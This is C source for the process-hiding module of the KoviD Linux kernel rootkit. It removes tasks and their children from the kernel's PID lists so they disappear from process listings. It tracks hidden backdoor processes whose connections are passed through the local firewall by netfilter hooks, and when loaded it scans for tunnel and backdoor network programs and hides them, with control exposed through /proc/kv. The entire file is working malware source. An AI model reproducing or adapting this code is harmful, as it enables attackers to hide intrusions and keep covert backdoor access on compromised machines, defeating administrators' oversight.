/**
 * Linux Kernel version <= 5.8.0
 * - hash
 *
 *  KoviD rootkit
 */
#include <linux/stop_machine.h>
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
#include <linux/sched/signal.h>
#else
#include <linux/sched.h>
#endif
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/inet.h>
#include "lkm.h"
#include "fs.h"
#include "netapp.h"

static LIST_HEAD(tasks_node);
#ifdef DEBUG_RING_BUFFER
static int ht_num;
#endif
static struct kernel_syscalls *kaddr;

/**
 * Return the task associated
 * with PID number
 */
static struct task_struct *_check_hide_by_pid(pid_t pid)
{
    struct hidden_tasks *ht, *ht_safe;
    list_for_each_entry_safe(ht, ht_safe, &tasks_node, list) {
        if(pid == ht->task->pid)
            return ht->task;
    }
    return NULL;
}

/**
 * Copy the task and hide it
 */
static int _hide_task(void *data) {
    struct hidden_tasks *ht;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
    struct hlist_node *link;
#else
    struct pid_link *link;
#endif
    struct hidden_tasks *node = (struct hidden_tasks *)data;
    if(!node)
        return -EINVAL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
    link = &node->task->pid_links[PIDTYPE_PID];
#else
    link = &node->task->pids[PIDTYPE_PID];
#endif
    if(!link)
        return -EFAULT;

    ht = kcalloc(1, sizeof(struct hidden_tasks) , GFP_KERNEL);
    if(!ht)
        return -ENOMEM;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
    hlist_del(link);
#else
    hlist_del(&link->node);
#endif
    ht->task = node->task;
    ht->group = node->group;
    ht->saddr = node->saddr;
    ht->fnode = fs_get_file_node(node->task);
    list_add_tail(&ht->list, &tasks_node);

    prinfo("hide [%p] %s : %d\n", ht->task, ht->task->comm, ht->task->pid);

    /** debug */
#ifdef DEBUG_RING_BUFFER
    ++ht_num;
#endif

    return 0;
}

static void _cleanup_node(struct hidden_tasks **node) {
    if (!node)
        return;

    list_del(&(*node)->list);
    if((*node)->fnode) /* can be NULL if kernel task */
        kfree((const void*)(*node)->fnode);
    kfree((const void*)*node);
    *node = NULL;
}

static void _cleanup_node_list(struct task_struct *task) {
    struct hidden_tasks *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        if (task != node->task)
            continue;
        _cleanup_node(&node);
        break;
    }
}

/*
 * If the task being unhidden is a backdoor, it must be terminated to ensure
 * there are no lingering backdoors left active.
 */
static inline void _kill_task(struct task_struct *task) {
    if(!send_sig(SIGKILL, task, 0) == 0)
        prerr("kill failed for task %p\n", task);
}

static int _unhide_task(void *data) {
    struct task_struct *task;
    struct hidden_tasks *ht = (struct hidden_tasks *)data;
    if (!ht) goto invalid;

    task = ht->task;
    if (!task) goto invalid;

    /**
     * safe as this is within heavy stop_machine context
     */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0)
    kaddr->k_attach_pid(task, PIDTYPE_PID, task_pid(task));
#else
    kaddr->k_attach_pid(task, PIDTYPE_PID);
#endif

    /*
     * For active backdoors, 'saddr' should match the active outgoing
     * connection. In sock.c, references for these backdoors are maintained in a list.
     * This is necessary due to active nf hooks that bypass the local firewall.
     * This list allows for distinguishing packets that belong to a backdoor.
     *
     * If there are netfilter rules blocking the connection, they will be bypassed,
     * and the connection will proceed as normal. However, when a backdoor task
     * is being unhidden, the reference to that task needs to be cleaned up
     * since the task will be terminated shortly.
     */
    if (ht->saddr) {
        kv_bd_cleanup_item(&ht->saddr);
    }

    prinfo("unhide [%p] %s : %d\n", task, task->comm, task->pid);
    return 0;
invalid:
    prinfo("Invalid task\n");
    return -EINVAL;
}

static LIST_HEAD(children_node);
struct to_hide_tasks {
    struct task_struct *task;
    struct list_head list;
};

/**
 * depth-first search tree that looks for children
 */
static void _select_children(struct task_struct *task) {
    struct list_head *list;
    struct to_hide_tasks *tht = kcalloc(1, sizeof(struct to_hide_tasks), GFP_KERNEL);

    /*
     * Here, I begin by obtaining the list of child tasks.
     * In the _fetch_children_and_hide_tasks() function, I iterate through this list
     * in reverse order, hiding one task at a time. This method is chosen for safety
     * reasons, as it's safer than simultaneously listing and hiding tasks.
     *
     * It's worth noting that this operation is relatively costly and is exclusively
     * invoked from the userland interface.
     */
    if (tht) {
        tht->task = task;
        list_add_tail(&tht->list, &children_node);
    }

    list_for_each(list, &task->children) {
        struct task_struct *child = list_entry(list, struct task_struct, sibling);
        _select_children(child);
    }
}

static void _fetch_children_and_hide_tasks(struct task_struct *task, __be32 saddr) {
    struct to_hide_tasks *node, *node_safe;

    list_for_each_entry_safe_reverse(node, node_safe, &children_node, list) {
        if (node && node->task) {
            struct hidden_tasks ht = { .task = node->task,
                .saddr = saddr, .group = task->pid };
            int status;
            if ((status = stop_machine(_hide_task, &ht, NULL)))
                prerr("error hiding_task %p: %d\n", ht.task, status);
            list_del(&node->list);
            kfree(node);
            node = NULL;
        }
    }
}

static void _unhide_children(struct task_struct *task) {
    struct hidden_tasks *node, *node_safe;

    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        if (node->saddr) {
            if (node->group == task->pid || node->task->pid == task->pid) {
                prwarn("Fuck-off! backdoor can only be unhidden either by exit or rmmod: %d\n", task->pid);
                break;
            }
            continue;
        }
        if (node->group == task->pid) {
            int status;
            if ((status = stop_machine(_unhide_task, node, NULL))) {
                prerr("!!!! Error unhide_task %p: %d\n", node->task, status);
            } else {
                _cleanup_node(&node);
#ifdef DEBUG_RING_BUFFER
                --ht_num;
#endif
            }
        }
    }
}

struct reload_hidden {
    struct task_struct *task;
    unsigned int msecs;
};

static int _reload_hidden_task(void *t) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
    struct kernel_syscalls *kaddr = kv_kall_load_addr();
#endif
    struct reload_hidden *reload = (struct reload_hidden*)t;
    struct task_struct *task;
    unsigned int msecs;

    if (!reload || !reload->task)
        goto error;

    task = reload->task;
    msecs = reload->msecs;

    msleep(msecs);
    if (task)
    {
        struct hidden_status status = { .saddr = 0 };
        if (!kv_find_hidden_pid(&status, task->pid))
            goto out;

        /**
         * this will unhide the task
         * and make its children visible
         * */
        kv_hide_task_by_pid(task->pid,
                status.saddr , NO_CHILDREN /** unhide only this task */);

        /**
         * Now hide the task, side effect is that
         * children are re-evaluated */
        kv_hide_task_by_pid(task->pid,
                status.saddr , NO_CHILDREN);
    }
    goto out;
error:
    prerr("Failed to reload hidden task\n");
out:
    kfree(reload);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,17,0)
              kaddr->k_do_exit(0);
              return 0;
#else
              do_exit(0);
#endif
}

void kv_reload_hidden_task(struct task_struct *task) {
    struct reload_hidden *reload = kcalloc(1, sizeof(struct reload_hidden), GFP_KERNEL);
    if (!reload) {
        prerr("%s: Insufficient memory\n", __FUNCTION__);
        return;
    }
    reload->task = task;
    reload->msecs = 300;

    /** short lived, no need to hide this kthread */
    (void)kthread_run(_reload_hidden_task, reload, "dontblink");
}


bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid) {
    struct hidden_tasks *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        if (pid != node->task->pid) continue;
        if (status) {
            status->hidden = true;
            status->saddr = node->saddr;
        }
        return true;
    }
    return false;
}

bool kv_find_hidden_task(struct task_struct *task) {
    struct hidden_tasks *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        if (task == node->task)
            return true;
    }
    return false;
}


void kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op) {
    struct task_struct *task = _check_hide_by_pid(pid);
    if(task) {
        if (op == CHILDREN)
            _unhide_children(task);
        else {
            struct hidden_tasks ht = { .task = task, .saddr = saddr };
            int status;
            if ((status = stop_machine(_unhide_task, &ht, NULL))) {
                prerr("!!!! Error unhide_task %p: %d\n", ht.task, status);
            } else {
                /** operate within list safe */
                _cleanup_node_list(ht.task);
#ifdef DEBUG_RING_BUFFER
                --ht_num;
#endif
            }
        }
    } else if ((task = get_pid_task(find_get_pid(pid), PIDTYPE_PID))) {
        /* if visible, hide */
        _select_children(task);
        _fetch_children_and_hide_tasks(task, saddr);
    }
}

/**
 * Exiting from one BD, exits ALL
 */
void kv_unhide_task_by_pid_exit_group(pid_t pid) {
    struct hidden_tasks *node, *node_safe;

    /** First unhide ALL backdoor tasks */
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        int status;
        if (!node->saddr) continue;

        if ((status = stop_machine(_unhide_task, node, NULL))) {
            prerr("error unhide_task %d\n", status);
            continue;
        }
    }

    /** Now cleanup and kill each one of them */
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        struct task_struct *task;
        if (!node->saddr) continue;

        task = node->task;
        _cleanup_node(&node);

        _kill_task(task);
#ifdef DEBUG_RING_BUFFER
        --ht_num;
#endif
    }
}

/**
 * Main cleanup
 * Called during rmmod
 */
void kv_pid_cleanup(void) {
    struct hidden_tasks *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        int status;
        if ((status = stop_machine(_unhide_task, node, NULL))) {
            prinfo("error unhide_task %d\n", status);
            continue;
        }
        if (node->saddr)
            continue;

        _cleanup_node(&node);
#ifdef DEBUG_RING_BUFFER
        --ht_num;
#endif
    }
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        struct task_struct *task = node->task;

        prinfo("cleaning [%p] %s : %d\n", task, task->comm, task->pid);
        _cleanup_node(&node);
        _kill_task(task);
#ifdef DEBUG_RING_BUFFER
        --ht_num;
#endif
    }

#ifdef DEBUG_RING_BUFFER
    if (ht_num)
        prwarn("warning: ht_num != 0: %d\n", ht_num);
#endif
}

void kv_show_saved_tasks(void) {
    struct hidden_tasks *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        if(node->fnode) {
            prinfo("%s : %s : ino %llu : task %p : %s : pid %d : group %d\n",
                    node->saddr ? "BD" : "Task", node->fnode->filename, node->fnode->ino, node->task,
                    node->task->comm, node->task->pid, node->group);
        } else {
            prinfo("Kthread : task %p : %s : pid %d : group %d\n", node->task,
                    node->task->comm, node->task->pid, node->group);
        }
    }
}

bool kv_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct*, void *), void *priv) {

    struct hidden_tasks *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        if (!node->saddr) continue;
        if (cb(node->task, priv)) return true;
    }
    return false;
}

bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *priv) {
    struct hidden_tasks *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &tasks_node, list) {
        if (!node->saddr) continue;
        if (cb(node->saddr, priv)) return true;
    }
    return false;
}

/*
 * This function runs once during initialization.
 * Its primary purpose is to hide network applications, such as tunnels
 * or external backdoor-like applications, except for the built-in ones.
 *
 * It performs a comprehensive scan of all processes that are running on
 * the system when KoviD module is loaded. It is important to note
 * that this function also conceals the connections of network applications.
 * For more information, refer to 'netapp.h'.
 */
void kv_scan_and_hide_netapp(void) {
    struct task_struct *t;

    for_each_process(t) {

        short i = 0;
        struct fs_file_node *fnode;

        if (kv_find_hidden_task(t)) continue;
        if (!(fnode = fs_get_file_node(t))) continue;

        /* XXX: optimise this */
        for (; netapp_list[i] != NULL; ++i) {
            if (strcmp(netapp_list[i], fnode->filename)) continue;
            prinfo("Hide netapp task: %d %s i=%d '%s'\n", t->pid, fnode->filename, i, netapp_list[i]);
            /**
             * notice that any netapp added here
             * will NOT be killed if kv is unloaded
             * In reality an application that is listed in netapp_list will be handled
             * in the same way as if you manually hide a parent process:
             *  echo <pid of parent> >/proc/kv
             */
            kv_hide_task_by_pid(t->pid, 0 /* not a backdoor */, CHILDREN /* hide children */);
            break;
        }

        kfree(fnode);
    }
}

bool kv_pid_init(struct kernel_syscalls *fn_addr) {
    if (!fn_addr) {
        prerr("kv_pid_inti: Invalid argument\n");
        return false;
    }

    kaddr = fn_addr;
    if (!kaddr->k_attach_pid) {
        prerr("kv_pid_init: Could not load\n");
        return false;
    }

    return true;
}
